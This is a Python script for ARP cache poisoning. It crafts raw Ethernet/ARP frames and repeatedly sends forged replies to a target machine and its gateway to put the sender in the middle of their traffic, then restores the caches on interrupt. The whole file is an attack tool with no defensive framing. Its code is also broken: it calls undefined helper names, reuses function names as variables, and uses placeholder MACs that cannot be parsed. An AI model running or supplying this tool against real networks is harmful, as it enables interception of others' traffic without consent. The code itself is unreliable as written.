import socket
import struct
import time

def ethernet_frame(src_mac, dst_mac):
    dst_mac_bytes = struct.pack('!6B', *[int(x, 16) for x in dst_mac.split(':')])
    src_mac_bytes = struct.pack('!6B', *[int(x, 16) for x in src_mac.split(':')])
    eth_type = struct.pack('!H', 0x0806) 
    return dst_mac_bytes + src_mac_bytes + eth_type

def arp_packet(src_mac, src_ip, dst_mac, dst_ip, op=2):
    htype = struct.pack('!H', 1)
    ptype = struct.pack('!H', 0x0800)
    hlen = struct.pack('!B', 6)
    plen = struct.pack('!B', 4)
    operation = struct.pack('!H', op)  # 1 - request 2 - reply

    src_mac_bytes = struct.pack('!6B', *[int(x, 16) for x in src_mac.split(':')])
    src_ip_bytes = socket.inet_aton(src_ip)
    dst_mac_bytes = struct.pack('!6B', *[int(x, 16) for x in dst_mac.split(':')])
    dst_ip_bytes = socket.inet_aton(dst_ip)

    return htype + ptype + hlen + plen + operation + src_mac_bytes + src_ip_bytes + dst_mac_bytes + dst_ip_bytes

def poison_arp(interface, src_mac, target_mac, gateway_mac, target_ip, gateway_ip):
    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
    sock.bind((interface, 0))

    ethernet_frame = create_ethernet_frame(src_mac, target_mac)
    arp_packet = create_arp_packet(src_mac, gateway_ip, target_mac, target_ip)
    packet_target = ethernet_frame + arp_packet

    ethernet_frame = create_ethernet_frame(src_mac, gateway_mac)
    arp_packet = create_arp_packet(src_mac, target_ip, gateway_mac, gateway_ip)
    packet_gateway = ethernet_frame + arp_packet

    while True:
        sock.send(packet_target)
        sock.send(packet_gateway)
        print("...Poisoning ARP...")
        time.sleep(2)

def restore_arp(interface, src_mac, target_mac, gateway_mac, target_ip, gateway_ip):
    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
    sock.bind((interface, 0))

    ethernet_frame = create_ethernet_frame(gateway_mac, target_mac)
    arp_packet = create_arp_packet(gateway_mac, gateway_ip, target_mac, target_ip)
    packet_target = ethernet_frame + arp_packet

    ethernet_frame = create_ethernet_frame(target_mac, gateway_mac)
    arp_packet = create_arp_packet(target_mac, target_ip, gateway_mac, gateway_ip)
    packet_gateway = ethernet_frame + arp_packet

    for _ in range(3):
        sock.send(packet_target)
        sock.send(packet_gateway)
        time.sleep(1)

def main():
    interface = "enp1s0"
    src_mac = "00:00:00:00:00:00" # source mac
    target_mac = "xx:xx:xx:xx:xx:xx"
    gateway_mac = "yy:yy:yy:yy:yy:yy"
    target_ip = "192.168.1.100"
    gateway_ip = "192.168.1.1"

    print("...Started ARP Poisoning...")
    try:
        poison_arp(interface, src_mac, target_mac, gateway_mac, target_ip, gateway_ip)
    except KeyboardInterrupt:
        restore_arp(interface, src_mac, target_mac, gateway_mac, target_ip, gateway_ip)

if __name__ == "__main__":
    main()